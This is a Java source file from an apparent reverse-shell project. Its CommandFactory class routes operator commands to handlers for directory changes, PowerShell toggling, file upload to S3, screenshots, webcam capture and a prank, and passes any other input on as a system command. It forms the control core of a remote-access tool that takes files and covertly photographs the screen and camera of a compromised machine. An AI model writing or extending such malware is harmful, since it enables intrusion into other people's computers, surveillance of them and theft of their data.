package com.mtattab.reverseshell.service.factory;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.service.commands.*;
import com.mtattab.reverseshell.util.DataManipulationUtil;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CommandFactory {


    public static Command createCommand(String command){
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
        String firstArgument= commands.get(0).toLowerCase();
        Map<String,Command> commandsList = new HashMap<>();
        commandsList.put("/??", new HelpCommand());

        commandsList.put("cd", new ChangeDirectoryCommand());
        commandsList.put("powershell", new TogglePowerShellCommand());
        commandsList.put("upload", new UploadToS3Command());
        commandsList.put("screenshot", new ScreenShotCommand());
        commandsList.put("camera-shot", new CameraScreenShotCommand());

        commandsList.put("rick-roll", new RickRollCommand());
        commandsList.put("/exit", new TerminateShellCommand());







// if not found redirect to system command
        return commandsList.get(firstArgument) == null ? new SystemCommand()
                : commandsList.get(firstArgument) ;
    }
}
